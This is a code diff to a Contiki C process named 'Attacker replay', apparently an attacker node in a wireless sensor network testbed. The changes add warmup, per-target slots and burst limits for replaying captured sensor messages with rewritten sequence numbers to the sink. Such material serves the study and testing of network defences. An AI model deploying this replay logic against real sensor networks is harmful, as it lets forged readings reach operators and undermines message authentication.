@@ -14,6 +14,9 @@
 #define MAC_KEY 0x6a09e667u
 
 #define REPLAY_INTERVAL_MS 500
+#define REPLAY_WARMUP_SEC 3
+#define REPLAY_SLOT_SEC 3
+#define REPLAY_BURST_PACKETS 2
 
 PROCESS(attacker_replay_proc, "Attacker replay");
 AUTOSTART_PROCESSES(&attacker_replay_proc);
@@ -43,12 +46,18 @@ static uint8_t current_channel = RADIO_CHANNEL_START;
 static uint8_t channel_index = 0;
 static const uint8_t channel_list[RADIO_CHANNEL_COUNT] = {129, 130, 131, 132};
 static const linkaddr_t sink_addr = {{1, 0}};
+static uint8_t targets_pinned;
+static uint8_t target_cursor;
+static uint32_t warmup_started_at;
+static uint32_t slot_started_at;
+static uint8_t slot_packets_sent;
+static attack_target_t *slot_target;
 
 static void recv_mesh(struct mesh_conn *c, const linkaddr_t *from, uint8_t hops);
 static const struct mesh_callbacks mesh_cb = { recv_mesh, NULL, NULL };
 static struct mesh_conn mesh;
 
-static void send_replay_to_target(attack_target_t *target, void *ctx);
+static void maybe_send_replay(void);
 
 static uint32_t
 mac_fnv1a(const void *data, size_t len)
@@ -116,11 +125,17 @@ PROCESS_THREAD(attacker_replay_proc, ev, data)
   current_channel = channel_list[channel_index % RADIO_CHANNEL_COUNT];
   mesh_open(&mesh, current_channel, &mesh_cb);
   attack_targets_init();
+  targets_pinned = 0;
+  target_cursor = 0;
+  warmup_started_at = clock_seconds();
+  slot_started_at = 0;
+  slot_packets_sent = 0;
+  slot_target = NULL;
   etimer_set(&timer, (CLOCK_SECOND * REPLAY_INTERVAL_MS) / 1000);
 
   while(1) {
     PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
-    attack_targets_for_each(send_replay_to_target, NULL);
+    maybe_send_replay();
 
     etimer_reset(&timer);
   }
@@ -129,15 +144,45 @@ PROCESS_THREAD(attacker_replay_proc, ev, data)
 }
 
 static void
-send_replay_to_target(attack_target_t *target, void *ctx)
+maybe_send_replay(void)
 {
+  uint32_t now;
   sensor_msg_t msg;
-  (void)ctx;
+  uint8_t pinned_count;
 
-  memcpy(&msg, &target->last_seen_msg, sizeof(msg));
-  msg.seq = attack_target_replay_seq(target);
+  now = clock_seconds();
 
-  set_channel(target->channel);
+  if(!targets_pinned) {
+    if((now - warmup_started_at) < REPLAY_WARMUP_SEC) {
+      return;
+    }
+    pinned_count = attack_targets_pin_active();
+    if(pinned_count == 0) {
+      warmup_started_at = now;
+      return;
+    }
+    targets_pinned = 1;
+    slot_started_at = 0;
+    slot_packets_sent = 0;
+    slot_target = NULL;
+  }
+
+  if(slot_target == NULL || slot_started_at == 0 ||
+     (now - slot_started_at) >= REPLAY_SLOT_SEC) {
+    slot_target = attack_targets_next_active(&target_cursor);
+    slot_started_at = now;
+    slot_packets_sent = 0;
+  }
+
+  if(slot_target == NULL || slot_packets_sent >= REPLAY_BURST_PACKETS) {
+    return;
+  }
+
+  memcpy(&msg, &slot_target->last_seen_msg, sizeof(msg));
+  msg.seq = attack_target_replay_seq(slot_target);
+
+  set_channel(slot_target->channel);
   packetbuf_copyfrom(&msg, sizeof(msg));
   mesh_send(&mesh, &sink_addr);
+  slot_packets_sent++;
 }
